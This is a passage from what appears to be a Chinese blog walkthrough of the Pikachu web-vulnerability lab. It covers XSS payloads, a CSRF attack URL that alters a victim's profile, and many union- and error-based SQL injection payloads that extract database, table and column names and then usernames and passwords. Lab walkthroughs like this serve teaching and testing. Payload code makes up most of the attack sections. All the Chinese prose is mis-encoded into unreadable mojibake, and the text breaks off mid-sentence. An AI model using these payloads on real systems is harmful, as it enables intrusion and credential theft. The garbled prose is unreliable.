ï¼Œå•å¼•å·ä¾ç„¶å¯ä»¥ä½¿ç”¨\n\n![](https://img.jwt1399.top//img/20200728194027.png)\n\n**æ„é€ Payload:**å…ˆä½¿ç”¨å•å¼•å·é—­åˆaæ ‡ç­¾ï¼Œç„¶åå†è¿›è¡Œå¼¹æ¡†ã€‚æäº¤åéœ€è¦ç‚¹å‡»è¶…é“¾æ¥æ‰ä¼šå¼¹æ¡†\n\n```html\npayload1:\n#' onclick=alert('jwt') '\né—­åˆåï¼š<a href=\"#\" onclick=\"alert('jwt')\" ''>#' onclick=alert('jwt') '</a>\n\npayload2:\n#' onclick='alert(1399)\n\né—­åˆåï¼š<a href=\"#\" onclick=\"alert(1399)\">#' onclick='alert(1399)</a>\n```\n\n### xssä¹‹hrefè¾“å‡º\n\n**æºç åˆ†æï¼š**\n\n```php+HTML\n$message=htmlspecialchars($_GET['message'],ENT_QUOTES);\n$html.=\"<a href='{$message}'> é˜ä¸‹è‡ªå·±è¾“å…¥çš„urlè¿˜è¯·è‡ªå·±ç‚¹ä¸€ä¸‹å§</a>\";\n```\n\nä½¿ç”¨äº†éƒ½`htmlspecialchars`å‡½æ•°ï¼Œ`><\"'&`éƒ½è¢«HTMLå®ä½“åŒ–ï¼Œä¸”ç”¨æˆ·è¾“å…¥çš„åœ¨`href`æ ‡ç­¾é‡Œï¼Œå¯ä»¥ä½¿ç”¨javascriptåè®®æ¥æ‰§è¡Œjsä»£ç \n\n æ„é€ Payloadå¦‚ä¸‹ï¼Œæ²¡æœ‰ä¸Šé¢è¢«è½¬ä¹‰çš„å­—ç¬¦\n\n```javascript\njavascript:alert('jwt')\n```\n\n**é˜²å¾¡href :**\n\n- è¾“å…¥çš„æ—¶å€™åªå…è®¸ http æˆ– https å¼€å¤´çš„åè®®ï¼Œæ‰å…è®¸è¾“å‡º\n- å…¶æ¬¡å†è¿›è¡Œhtmlspecialcharså¤„ç†\n\n### xssä¹‹jsè¾“å‡º\n\n> æ¼æ´çš„è¾“å‡ºç‚¹æ˜¯åœ¨JSä¸­ï¼Œé€šè¿‡ç”¨æˆ·çš„è¾“å…¥åŠ¨æ€ç”ŸæˆJSä»£ç \n\néšä¾¿è¾“å…¥ä¸€äº›å­—ç¬¦ï¼Œæ£€æŸ¥é¡µé¢ä»£ç \n\n```javascript\n<script>\n    $ms='è¾“å…¥çš„å­—ç¬¦';\n    if($ms.length != 0){\n        if($ms == 'tmac'){\n            $('#fromjs').text('tmacç¡®å®å‰å®³,çœ‹é‚£å°çœ¼ç¥..')\n        }else {\n//            alert($ms);\n            $('#fromjs').text('æ— è®ºå¦‚ä½•ä¸è¦æ”¾å¼ƒå¿ƒä¸­æ‰€çˆ±..')\n        }\n    }\n</script>\n```\n\nè¿™æ®µJSä»£ç ä¼šæŠŠæˆ‘ä»¬çš„è¾“å…¥æ”¾åˆ°JSä¸­ï¼Œç„¶åå¯¹è¿™ä¸ªå˜é‡è¿›è¡Œåˆ¤æ–­ï¼Œç„¶åå†è¾“å‡º\n\n **æ„é€ Payloadï¼š**\n\nç”¨ä¸€ä¸ªå•å¼•å·å’Œ`</script>`é—­åˆæ‰é¡µé¢ä¸­çš„`<script>`ï¼Œç„¶åå†æ’å…¥è‡ªå·±çš„JSä»£ç \n\n```javascript\n'</script><script>alert('jwt')</script>\n```\n\n![](https://img.jwt1399.top//img/20200728201421.png)\n\nå…¶ä»–Payload\n\n```javascript\n'; alert(1); //\n'</script><script>alert(1)//\n```\n\n**ä¿®å¤éœ€è¦æ³¨æ„çš„é—®é¢˜ï¼š**\n\n1.è¿™é‡Œå¦‚æœè¿›è¡Œhtmlçš„å®ä½“ç¼–ç ,è™½ç„¶å¯ä»¥è§£å†³XSSçš„é—®é¢˜,ä½†æ˜¯å®ä½“ç¼–ç åçš„å†…å®¹,åœ¨JSé‡Œé¢ä¸ä¼šè¿›è¡Œç¿»è¯‘,è¿™æ ·ä¼šå¯¼è‡´å‰ç«¯çš„åŠŸèƒ½æ— æ³•ä½¿ç”¨ã€‚\n\n2.æ‰€ä»¥åœ¨JSçš„è¾“å‡ºç‚¹åº”è¯¥ä½¿ç”¨\\å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰\n\n### XSSé˜²èŒƒ\n\n **è¾“å…¥è¿‡æ»¤ï¼šå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å¯èƒ½å¯¼è‡´XSSæ”»å‡»çš„å­—ç¬¦è¾“å…¥;**\n **è¾“å‡ºè½¬ä¹‰ï¼šæ ¹æ®è¾“å‡ºç‚¹çš„ä½ç½®å¯¹è¾“å‡ºåˆ°å‰ç«¯çš„å†…å®¹è¿›è¡Œé€‚å½“è½¬ä¹‰;**\n\n**å‚è€ƒï¼š**\n\nhttps://www.cnblogs.com/dogecheng/p/11556221.html\n\nhttps://blog.csdn.net/weixin_41652128/article/details/95669624\n\n[XSSå¸¸è§Payload](https://www.cnblogs.com/xuehen/p/4814237.html)\n\n## **CSRF**\n\n> è·¨ç«™è¯·æ±‚ä¼ªé€ -Cross-site request forgery ç®€ç§°ä¸ºâ€œCSRFâ€ï¼Œåœ¨CSRFçš„æ”»å‡»åœºæ™¯ä¸­æ”»å‡»è€…ä¼šä¼ªé€ ä¸€ä¸ªè¯·æ±‚ï¼ˆè¿™ä¸ªè¯·æ±‚ä¸€èˆ¬æ˜¯ä¸€ä¸ªé“¾æ¥ï¼‰ï¼Œç„¶åæ¬ºéª—ç›®æ ‡ç”¨æˆ·è¿›è¡Œç‚¹å‡»ï¼Œç”¨æˆ·ä¸€æ—¦ç‚¹å‡»äº†è¿™ä¸ªè¯·æ±‚ï¼Œæ•´ä¸ªæ”»å‡»å°±å®Œæˆäº†ã€‚æ‰€ä»¥CSRFæ”»å‡»ä¹Ÿæˆä¸º\"one click\"æ”»å‡»ã€‚ \n\nç®€å•ç†è§£ï¼šæ”»å‡»è€…ç›—ç”¨äº†ä½ çš„èº«ä»½ï¼Œä»¥ä½ çš„åä¹‰å‘é€æ¶æ„è¯·æ±‚ï¼Œå¯¹æœåŠ¡å™¨æ¥è¯´è¿™ä¸ªè¯·æ±‚æ˜¯å®Œå…¨åˆæ³•çš„ï¼Œä½†æ˜¯å´å®Œæˆäº†æ”»å‡»è€…æ‰€æœŸæœ›çš„ä¸€ä¸ªæ“ä½œï¼Œæ¯”å¦‚ä»¥ä½ çš„åä¹‰å‘é€é‚®ä»¶ã€å‘æ¶ˆæ¯ï¼Œç›—å–ä½ çš„è´¦å·ï¼Œæ·»åŠ ç³»ç»Ÿç®¡ç†å‘˜ï¼Œç”šè‡³äºè´­ä¹°å•†å“ã€è™šæ‹Ÿè´§å¸è½¬è´¦ç­‰ã€‚\n\n**CSRFä¸XSSçš„åŒºåˆ«ï¼š**\n\nCSRFæ˜¯å€Ÿç”¨æˆ·çš„æƒé™å®Œæˆæ”»å‡»ï¼Œæ”»å‡»è€…å¹¶æ²¡æœ‰æ‹¿åˆ°ç”¨æˆ·çš„æƒé™ï¼Œè€ŒXSSæ˜¯ç›´æ¥ç›—å–åˆ°äº†ç”¨æˆ·çš„æƒé™ï¼Œç„¶åå®æ–½ç ´åã€‚\n\n### CSRF(get)\n\næ ¹æ®æç¤ºï¼Œè´¦å·æœ‰vince/allen/kobe/grady/kevin/lucy/liliï¼Œå¯†ç å…¨éƒ¨æ˜¯123456\n\næˆ‘ä»¬ç™»å½• kobe ç”¨æˆ·ï¼Œç™»å½•åæ¥åˆ°ä¸ªäººä¸­å¿ƒï¼Œå¯ä»¥åœ¨è¿™ä¿®æ”¹ä¸ªäººä¿¡æ¯\n\né‚£ä¹ˆæ›´æ”¹kobeä¿¡æ¯ï¼Œå¹¶æŠ“åŒ…\n\n![](https://img.jwt1399.top//img/20200807180231.png)\n\nä»è¯·æ±‚åŒ…å¯ä»¥çœ‹å‡ºï¼Œåå°æ²¡åš CSRF tokenï¼Œä¸”æ˜¯é€šè¿‡ GET è¯·æ±‚æ¥æäº¤ä¿®æ”¹ä¿¡æ¯çš„\n\n**Payloadï¼š**\n\nå°†æ€§åˆ«ã€æ‰‹æœºã€ä½å€ã€é‚®ç®±éƒ½é‡æ–°å®šä¹‰æ•°æ®\n\n```\nhttp://127.0.0.1/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=2&phonenum=123456&add=Chengdu&email=jwt@163.com&submit=submit\n```\n\nå°†è¯¥URLå‘é€ç»™ç”¨æˆ·ï¼Œè‹¥ç”¨æˆ·åœ¨`ç™»å½•çŠ¶æ€`ä¸‹ç‚¹å‡»è¿™ä¸ªURLï¼Œåˆ™è¯¥ç”¨æˆ·çš„ä¿¡æ¯å°±ä¼šè¢«æ›´æ”¹ä¸ºæˆ‘ä»¬å®šä¹‰çš„ä¿¡æ¯\n\n**å®ä¾‹æ¼”ç¤ºï¼š**\n\nä¾‹å¦‚ï¼Œæˆ‘ä»¬è®©ç”¨æˆ· allen ç‚¹å‡»ä¸€ä¸‹ä¸Šé¢è¿™ä¸ª Payload é“¾æ¥\n\n1ã€allenç”¨æˆ·ç™»å½•ï¼ŒæŸ¥çœ‹ä¸ªäººä¿¡æ¯\n\n![](https://img.jwt1399.top//img/20200807201741.png)\n\n2ã€allenç”¨æˆ·ç‚¹å‡»ä¸Šé¢æˆ‘ä»¬æ„é€ çš„Payload\n\n3ã€å†æ¬¡æŸ¥çœ‹ä¿¡æ¯ï¼Œå‘ç°allençš„æ€§åˆ«ã€æ‰‹æœºã€ä½å€ã€é‚®ç®±ï¼Œå·²ç»ä¿®æ”¹ä¸ºæˆ‘ä¸Šé¢ Payload ä¸­å®šä¹‰çš„æ•°æ®äº†ï¼ŒæˆåŠŸå®ç° CSRF æ”»å‡»\n\n![](https://img.jwt1399.top//img/20200807201741.png)\n\n### CSRF(post)\n\næŠ“åŒ…å‘ç°ï¼Œè¯·æ±‚é€šè¿‡POSTæ–¹å¼æäº¤ï¼Œä»è€Œæ— æ³•åƒå‰é¢ä¸€æ ·é€šè¿‡ä¼ªé€ URLæ¥è¿›è¡Œæ”»å‡»\n\nè¯¦ç»†åˆ©ç”¨è¿‡ç¨‹è¯·å‚è€ƒï¼š[Pikachuæ¼æ´é¶åœºç³»åˆ—ä¹‹CSRF](https://www.naraku.cn/posts/25.html)\n\nCSRFTesterä¸‹è½½åœ°å€ï¼šhttps://wiki.owasp.org/images/0/08/CSRFTester-1.0.zip\n\n### CSRF Token\n\nåŸç†ï¼šCSRFçš„ä¸»è¦é—®é¢˜æ˜¯æ•æ„Ÿæ“ä½œçš„é“¾æ¥å®¹æ˜“è¢«ä¼ªé€ ã€‚è€Œåªè¦åœ¨æ¯æ¬¡è¯·æ±‚æ—¶éƒ½å¢åŠ ä¸€ä¸ªéšæœºç `Token`ï¼Œåå°æ¯æ¬¡éƒ½å¯¹è¿™ä¸ªéšæœºç è¿›è¡ŒéªŒè¯ï¼Œåˆ™å¯ä»¥æœ‰æ•ˆåœ°é˜²æ­¢CSRF\n\nåœ¨æºç `token_get_edit.php`ä¸­çœ‹åˆ°ï¼Œæ¯æ¬¡åˆ·æ–°é¡µé¢ï¼Œéƒ½ä¼šè°ƒç”¨`set_token()`å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šæŠŠ`SESSION`ä¸­`Token`é”€æ¯ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªæ–°çš„`Token`ï¼Œå¹¶å°†è¿™ä¸ª`Token`ä¼ åˆ°å‰ç«¯è¡¨å•ä¸­\n\n```html\n<div id=\"per_info\">\n   <form method=\"get\">\n   <h1 class=\"per_title\">hello,{$name},æ¬¢è¿æ¥åˆ°ä¸ªäººä¼šå‘˜ä¸­å¿ƒ | <a style=\"color:bule;\" href=\"token_get.php?logout=1\">é€€å‡ºç™»å½•</a></h1>\n   <p class=\"per_name\">å§“å:{$name}</p>\n   <p class=\"per_sex\">æ€§åˆ«:<input type=\"text\" name=\"sex\" value=\"{$sex}\"/></p>\n   <p class=\"per_phone\">æ‰‹æœº:<input class=\"phonenum\" type=\"text\" name=\"phonenum\" value=\"{$phonenum}\"/></p>    \n   <p class=\"per_add\">ä½å€:<input class=\"add\" type=\"text\" name=\"add\" value=\"{$add}\"/></p> \n   <p class=\"per_email\">é‚®ç®±:<input class=\"email\" type=\"text\" name=\"email\" value=\"{$email}\"/></p>\n       \n   <input type=\"hidden\" name=\"token\" value=\"{$_SESSION['token']}\" />\n       \n   <input class=\"sub\" type=\"submit\" name=\"submit\" value=\"submit\"/>\n   </form>\n</div>\n```\n\nå½“æ¯æ¬¡æäº¤è¡¨å•æ—¶ï¼Œè¿™ä¸ª`Token`å€¼å°±ä¼šä¼ åˆ°åå°ä¸`SESSION`ä¸­çš„`Token`è¿›è¡Œæ¯”è¾ƒï¼Œè‹¥ä¸ç›¸ç­‰ï¼Œæ­¤æ¬¡è¡¨å•åˆ™æäº¤å¤±è´¥ã€‚æ‰€ä»¥é»‘å®¢ç”±äºä¸èƒ½å¾—çŸ¥ç”¨æˆ·å½“å‰çš„`Token`å€¼ï¼Œä»è€Œæ— æ³•è¿›è¡ŒCSRFæ”»å‡»ã€‚\n\n### CSRFé˜²èŒƒ\n\n- å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå¢åŠ å®‰å…¨çš„tokenï¼›\n- å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå¢åŠ å®‰å…¨çš„éªŒè¯ç ï¼›\n- å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå®æ–½å®‰å…¨çš„é€»è¾‘æµç¨‹ï¼Œæ¯”å¦‚ä¿®æ”¹å¯†ç æ—¶ï¼Œéœ€è¦å…ˆæ ¡éªŒæ—§å¯†ç ç­‰ã€‚\n\n## **SQL-Inject**\n\n> **SQLæ³¨å…¥æ¼æ´ä¸»è¦å½¢æˆçš„åŸå› æ˜¯åœ¨æ•°æ®äº¤äº’ä¸­ï¼Œå‰ç«¯çš„æ•°æ®ä¼ å…¥åˆ°åå°å¤„ç†æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„åˆ¤æ–­ï¼Œå¯¼è‡´å…¶ä¼ å…¥çš„â€œæ•°æ®â€æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­åï¼Œè¢«å½“ä½œSQLè¯­å¥çš„ä¸€éƒ¨åˆ†æ‰§è¡Œã€‚ ä»è€Œå¯¼è‡´æ•°æ®åº“å—æŸï¼ˆè¢«è„±è£¤ã€è¢«åˆ é™¤ã€ç”šè‡³æ•´ä¸ªæœåŠ¡å™¨æƒé™æ²¦é™·ï¼‰ã€‚**\n\n**è¿™é‡Œæˆ‘å°±ä¸è®²åŸç†äº†ï¼Œéœ€è¦äº†è§£SQLæ³¨å…¥åŸç†çš„ï¼Œè¯·çœ‹æˆ‘å¦ä¸€ç¯‡æ–‡ç« ï¼š[æ·±å…¥å‰–æSQLæ³¨å…¥](https://jwt1399.top/posts/32179.html)**\n\n### **æ•°å­—å‹æ³¨å…¥(post)**\n\n**ç›´æ¥ BurpSuite æŠ“åŒ…ï¼Œå‘åˆ° Repeater ä¸­ï¼Œä¿®æ”¹ id å‚æ•°çš„å€¼ï¼ŒæŸ¥çœ‹å“åº”ç»“æœã€‚**\n\n```sql\n#æŸ¥çœ‹é¡µé¢å˜åŒ–ï¼Œåˆ¤æ–­sqlæ³¨å…¥ç±»åˆ« \nid=1\nid=1'\n\n#ç¡®å®šå­—æ®µæ•° \nid=1 order by 2 \nid=1 order by 3 \n\n#è”åˆæŸ¥è¯¢æŸ¥çœ‹æ˜¾ç¤ºä½ \nid=-1 union select 1,2 \n\n#çˆ†åº“ã€pikachuã€‘\nid=-1 union select 1,group_concat(schema_name) from information_schema.schemata \næˆ–è€…\nid=-1 union select 1,database() \n\n#çˆ†è¡¨ã€httpinfo,member,message,users,xssblindã€‘\nid=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() \n\n#çˆ†åˆ—ã€...user,password,...ã€‘ \nid=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' \n\n#çˆ†å€¼ \nid=-1 union select 1,concat_ws('-',username,password) from users\n```\n\n**![](https://img.jwt1399.top//img/20200726142002.png)**\n\n### **å­—ç¬¦å‹æ³¨å…¥(get)**\n\n```sql\n#æŸ¥çœ‹é¡µé¢å˜åŒ–ï¼Œåˆ¤æ–­sqlæ³¨å…¥ç±»åˆ« \n1\n1'\n\n#ç¡®å®šå­—æ®µæ•°ã€2ã€‘  \n1' order by 3 # \n1' order by 4 # \n\n#è”åˆæŸ¥è¯¢æŸ¥çœ‹æ˜¾ç¤ºä½\n-1' union select 1,2 # \n\n#çˆ†åº“ã€pikachuã€‘ \n-1' union select 1,group_concat(schema_name) from information_schema.schemata #\næˆ–è€…\n-1' union select 1,database() # \n\n#çˆ†è¡¨ã€httpinfo,member,message,users,xssblindã€‘ \n-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #\n\n#çˆ†åˆ—ã€...,username,password,...ã€‘ \n-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #\n\n#çˆ†å€¼\n-1' union select 1,concat_ws('-',username,password) from users #\n```\n\n**![](https://img.jwt1399.top//img/20200726142232.png)**\n\n### **æœç´¢å‹æ³¨å…¥**\n\n**æœç´¢å‹æŸ¥è¯¢ä½¿ç”¨çš„ SQL è¯­å¥æ ¼å¼ï¼š**\n\n```sql\nselect username from user where username like '%{$username}%';\n```\n\n**æ­¤æ—¶å¯å°†`{$username}`éƒ¨åˆ†æ„é€ æˆ payloadï¼š`x%' union select 1,2 from users #`**\n\n**æ­¤æ—¶æ‰§è¡Œçš„ SQL è¯­å¥ä¸ºï¼š**\n\n```sql\nselect username from user where username like '%x%' union select 1,2 from users #%';\n```\n\n**æœç´¢å‹æ³¨å…¥ä½¿ç”¨ä¸Šé¢çš„å­—ç¬¦å‹æ³¨å…¥æ–¹æ³•ä¹Ÿå¯å®ç°æ³¨å…¥ï¼Œè¿™é‡Œæˆ‘å°±ä½¿ç”¨æ–°çš„ç»•è¿‡ payload**\n\n```sql\n#æŸ¥çœ‹é¡µé¢å˜åŒ–ï¼Œåˆ¤æ–­sqlæ³¨å…¥ç±»åˆ« \n1\n1'\n\n#ç¡®å®šå­—æ®µæ•°ã€3ã€‘  \nx%' order by 3 # \nx%' order by 4 # \n\n#è”åˆæŸ¥è¯¢æŸ¥çœ‹æ˜¾ç¤ºä½\nx%' union select 1,2,3 # \n\n#çˆ†åº“ã€pikachuã€‘ \nx%' union select 1,2,group_concat(schema_name) from information_schema.schemata #\næˆ–è€…\nx%' union select 1,2,database() # \n\n#çˆ†è¡¨ã€httpinfo,member,message,users,xssblindã€‘ \nx%' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #\n\n#çˆ†åˆ—ã€...,username,password,...ã€‘ \nx%' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' #\n\n#çˆ†å€¼\nx%' union select 1,2,concat_ws('-',username,password) from users #\n```\n\n### **xxå‹æ³¨å…¥**\n\n```sql\n#æŸ¥çœ‹é¡µé¢å˜åŒ–ï¼Œåˆ¤æ–­sqlæ³¨å…¥ç±»åˆ« \n1\n1'     #  for the right syntax to use near ''1'')' at line 1\n\nçŒœæµ‹SQLè¯­å¥ä¸ºselect username from user where username=('$name');\n\n\n#ç¡®å®šå­—æ®µæ•°ã€2ã€‘  \nx') order by 2 # \nx') order by 3 # \n\n#è”åˆæŸ¥è¯¢æŸ¥çœ‹æ˜¾ç¤ºä½\nx') union select 1,2 # \n\n#çˆ†åº“ã€pikachuã€‘ \nx') union select 1,group_concat(schema_name) from information_schema.schemata #\næˆ–è€…\nx') union select 1,database() # \n\n#çˆ†è¡¨ã€httpinfo,member,message,users,xssblindã€‘ \nx') union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #\n\n#çˆ†åˆ—ã€...,username,password,...ã€‘ \nx') union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #\n\n#çˆ†å€¼\nx') union select 1,concat_ws('-',username,password) from users #\n```\n\n### **â€œinsert/updateâ€æ³¨å…¥**\n\n> **insert /updateæ³¨å…¥æ˜¯æŒ‡æˆ‘ä»¬å‰ç«¯æ³¨å†Œçš„ä¿¡æ¯ï¼Œåå°ä¼šé€šè¿‡ insert/update è¿™ä¸ªæ“ä½œæ’å…¥/æ›´æ–°åˆ°æ•°æ®åº“ä¸­ã€‚å¦‚æœåå°æ²¡å¯¹æˆ‘ä»¬çš„è¾“å…¥åšé˜² SQL æ³¨å…¥å¤„ç†ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨æ³¨å†Œæ—¶é€šè¿‡æ‹¼æ¥ SQL æ³¨å…¥ã€‚**\n\n#### **insertæ³¨å…¥**\n\n**è¿›å…¥æ³¨å†Œé¡µé¢ï¼Œå¡«å†™å¿…å¡«çš„ä¸¤é¡¹ï¼Œç”¨æˆ·é‚£é‡Œè¾“å…¥å•å¼•å·ï¼Œå¯†ç è¾“å…¥123ï¼Œé¡µé¢ä¼šæœ‰æŠ¥é”™ä¿¡æ¯(` for the right syntax to use near '123'),'','','','')' at line 1`)ï¼Œè¯´æ˜å­˜åœ¨SQLæ³¨å…¥æ¼æ´**\n\n**çŒœæµ‹sqlè¯­å¥ä¸ºï¼š**\n\n```sql\n$query=\"insert into member(username,pw,sex,phonenum,email,address) values('$username','$password','$sex','$phonenum','$email','add')\";\n```\n**)æ„é€ Payloadï¼šæ­¤å¤„æœ€åå¤šåŠ ä¸€ä¸ª`)`é—­åˆ`value()`çš„`(`ï¼Œç”¨æ³¨é‡Šç¬¦`#`è§£å†³`value()`çš„`)`**\n\n**1ã€çˆ†åº“**\n\n**updatexml()å‡½æ•°ï¼š**\n\n```sql\n1' and updatexml(1,concat('~',database()),1)) #\n```\n\n**extractvalue()å‡½æ•°ï¼š**\n\n```sql\n1' and extractvalue(1,concat('~',database()))) #\n```\n\n**floor()å‡½æ•°ï¼š**\n\n```sql\n1' and (select 1 from (select count(*),concat('~',database(),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a))#\n```\n\n**2ã€çˆ†è¡¨**\n\n**updatexml()å‡½æ•°ï¼š**\n\n```sql\n1' and updatexml(1,concat('~',(select table_name from information_schema.tables where table_schema = database() limit 0,1)),1))#\n```\n\n**extractvalue()å‡½æ•°ï¼š**\n\n```sql\n1' and extractvalue(1,concat('~',(select table_name from information_schema.tables where table_schema = database() limit 0,1))))#\n```\n\n**floor()å‡½æ•°ï¼š**\n\n```sql\n1'and (select 1 from (select count(*),concat('~',(select table_name from information_schema.tables where table_schema = database() limit 0,1),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a))#\n```\n\n**3ã€çˆ†å­—æ®µ**\n\n**updatexml()å‡½æ•°ï¼š**\n\n```sql\n1' and updatexml(1,concat('~',(select column_name from information_schema.columns where table_name = 'users' limit 0,1)),1))#\n```\n\n**extractvalue()å‡½æ•°ï¼š**\n\n```sql\n1' and extractvalue(1,concat('~',(select column_name from information_schema.columns where table_name = 'users' limit 0,1))))#\n```\n\n**floor()å‡½æ•°ï¼š**\n\n```sql\n1'and (select 1 from (select count(*),concat('~',(select column_name from information_schema.columns where table_name = 'users' limit 0,1),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a))#\n```\n\n**4ã€çˆ†å€¼**\n\n**updatexml()å‡½æ•°ï¼š**\n\n```sql\næŸ¥usernameï¼š1' and updatexml(1,concat('~',(select username from users limit 0,1)),1))#\n\næŸ¥passwordï¼š1' and updatexml(1,concat(0,(select password from users where username='admin')),1))#\n\nupdatexml()ã€extractvalue()æœ‰é•¿åº¦é™åˆ¶ï¼Œå°†ä¹‹å‰æƒ³ç”¨æ¥æ ‡è®°ä½ç½®çš„â€™~'æ¢æˆ0ï¼Œè¿”å›å®Œæ•´çš„32ä½md5å€¼ï¼Œä¸æ”¹çš„è¯æ¯æ¬¡åªèƒ½æ˜¾ç¤º31ä¸ªå­—ç¬¦\n```\n\n**extractvalue()å‡½æ•°ï¼š**\n\n```sql\næŸ¥usernameï¼š1' and extractvalue(1,concat('~',(select username from users limit 0,1))))#\næŸ¥passwordï¼š1' and extractvalue(1,concat(0,(select password from users where username='admin'))))#\n```\n\n**floor()å‡½æ•°ï¼š**\n\n```sql\n1'and (select 1 from (select count(*),concat('~',(select concat(username,'~',password) from users limit 0,1),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a))#\n```\n\n#### **updateæ³¨å…¥**\n\n**æ³¨å†Œè´¦å·åç™»å½•ï¼Œå¯ä»¥ä¿®æ”¹ä¸ªäººä¿¡æ¯ï¼Œè¿›å…¥ä¿®æ”¹é¡µé¢ï¼Œå¡«å†™å››é¡¹é¡¹ï¼Œæ€§åˆ«é‚£é‡Œè¾“å…¥å•å¼•å·ï¼Œå¯†ç è¾“å…¥123ï¼Œé¡µé¢ä¼šæœ‰æŠ¥é”™ä¿¡æ¯(`  for the right syntax to use near '1',address='1',email='1'' where username='jwt'' at line 1`)ï¼Œè¯´æ˜å­˜åœ¨SQLæ³¨å…¥æ¼æ´**\n\n**çŒœæµ‹sqlè¯­å¥ä¸ºï¼š**\n\n```sql\n$query=\"update member set sex='$sex',phonenum='$phonenum',address='$add',email='$email' where username='xxx'\";\n```\n\n**æ„é€ Payloadï¼šä¸insertæ³¨å…¥ç›¸ä¼¼ï¼Œåªæ˜¯é—­åˆä¸åŒï¼Œæœ€åå°‘åŠ ä¸€ä¸ª`ï¼‰`**\n\n**çˆ†åº“**\n\n**updatexml()å‡½æ•°ï¼š**\n\n```sql\n1' and updatexml(1,concat('~',database()),1) #\n```\n\n**extractvalue()å‡½æ•°ï¼š**\n\n```sql\n1' and extractvalue(1,concat('~',database())) #\n```\n\n**floor()å‡½æ•°ï¼š**\n\n```sql\n1' and (select 1 from (select count(*),concat('~',database(),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a)#\n```\n\n**è·å–å…¶ä»–æ•°æ®åº“ä¿¡æ¯å‚ç…§ä¸Šé¢ insert æ³¨å…¥ï¼Œåªæ˜¯é—­åˆä¸åŒï¼Œæœ€åå°‘åŠ ä¸€ä¸ª`ï¼‰`,è¿™é‡Œå°ç®€æˆ‘å°±ä¸å†èµ˜è¿°äº†ã€‚**\n\n**å‚è€ƒï¼š**\n\n**[åˆ©ç”¨insertã€updateå’Œdeleteæ³¨å…¥è·å¾—æ•°æ®](https://www.cnblogs.com/babers/articles/7252401.html)**\n\n**[SQLæ³¨å…¥ä¹‹insert/update/deleteæ³¨å…¥](https://blog.csdn.net/weixin_44426869/article/details/104326877)**\n\n**[SQLæ³¨å…¥å®æˆ˜ä¹‹æŠ¥é”™æ³¨å…¥ç¯‡ï¼ˆupdatexml extractvalue floorï¼‰](https://www.cnblogs.com/c1047509362/p/12806297.html)**\n\n**[webå®éªŒä¸‰â€”â€”pikachuä¹‹sqlæ³¨å…¥](http://www.mamicode.com/info-detail-2864192.html)**\n\n### **â€œdeleteâ€æ³¨å…¥**\n\n**è¿™é‡Œæœ‰ä¸€ä¸ªç•™è¨€æ¿ï¼Œç‚¹åˆ é™¤å¯ä»¥æŠŠå¯¹åº”çš„ç•™è¨€åˆ æ‰ï¼Œç‚¹åˆ é™¤æ—¶ç”¨ BurpSuite æŠ“åŒ…ï¼Œå®é™…ä¸Šå°±æ˜¯ä¼ é€’äº†ä¸€ä¸ªç•™è¨€çš„ idï¼Œåå°æ ¹æ®è¿™ä¸ª id å»åˆ é™¤ç•™è¨€**\n\n**![](https://img.jwt1399.top//img/20200727164128.png)**\n\n**çŒœæµ‹sqlè¯­å¥ä¸ºï¼š**\n\n```sql\n$query=\"delete from message where id=x\";\n```\n\n**å‘é€åˆ° `Repeater` æ¨¡å—ä¸­ç»§ç»­è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°å¯èƒ½å­˜åœ¨æ•°å­—å‹æ³¨å…¥æ¼æ´ï¼Œ**\n\n**æ„é€ Payloadï¼šä¿®æ”¹idå€¼æ—¶ï¼Œéœ€è¦åšURLè½¬ç ï¼Œå†æ”¾åŒ…**\n\n**çˆ†åº“**\n\n**updatexml()å‡½æ•°ï¼š**\n\n```sql\n1 and updatexml(1,concat('~',database()),1)\n```\n\n**extractvalue()å‡½æ•°ï¼š**\n\n```sql\n1 and extractvalue(1,concat('~',database()))\n```\n\n**floor()å‡½æ•°ï¼š**\n\n```sql\n1 and (select 1 from (select count(*),concat('~',database(),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a)\n```\n\n**![](https://img.jwt1399.top//img/20200727165448.png)**\n\n**è·å–å…¶ä»–æ•°æ®åº“ä¿¡æ¯å‚ç…§ä¸Šé¢ insert æ³¨å…¥ï¼Œåªæ˜¯é—­åˆæ–¹å¼ä¸åŒï¼Œè¿™é‡Œå°ç®€æˆ‘å°±ä¸å†èµ˜è¿°äº†ã€‚**\n\n### **\"http header\"æ³¨å…¥**\n\n**æŸ¥çœ‹æç¤ºå¾—åˆ°ç™»å½•è´¦å·ã€admin / 123456ã€‘ï¼Œç™»é™†ä¹‹åä¼šè®°å½•ä»¥ä¸‹ä¿¡æ¯**\n\n```\nä½ çš„ipåœ°å€:192.168.137.1\n\nä½ çš„user agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 Edg/84.0.522.44\n\nä½ çš„http accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n\nä½ 